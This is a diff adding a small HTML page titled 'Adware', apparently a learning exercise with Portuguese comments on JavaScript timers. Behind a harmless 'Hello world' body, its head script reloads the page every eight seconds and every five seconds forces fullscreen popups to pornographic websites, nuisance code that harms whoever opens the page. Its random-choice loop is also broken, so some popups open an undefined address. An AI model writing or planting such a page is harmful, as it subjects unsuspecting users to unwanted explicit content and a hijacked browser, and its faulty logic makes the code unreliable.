@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adware</title>
+
+    <script>
+        //setInterval - Acao executada constantemente apos um determinado tempo
+
+        //setTimeout - Acao exeutada apos um determinado tempo
+
+        var refresh = function () {
+            window.location.reload()
+        }
+
+        var adware = function () {
+            var urls = ["https://www.xvideos.com", "https://www.chaturbate.com", "https://pornhub.com"]
+
+            do {
+
+                var indice = parseInt(Math.random() * 10)
+
+            } while (indice < 0 && indice >= urls.length)
+
+            window.open(urls[indice], "new_window", "fulscreen=1")
+
+        }
+
+        function openPopup(URL) {
+            window.open(URL, "_blank")
+        }
+
+        setInterval(refresh, 8000)
+
+        setInterval(adware, 5000)
+    </script>
+</head>
+
+<body>
+    <h1>Hello world!</h1>
+
+    <h2>Beauty Subtittle</h2>
+
+    <p>This is my beatiful paragraph !</p>
+
+    <button type="button" onclick="openPopup('https://www.google.com')">Click Here!</button>
+
+
+</body>
+
+</html>
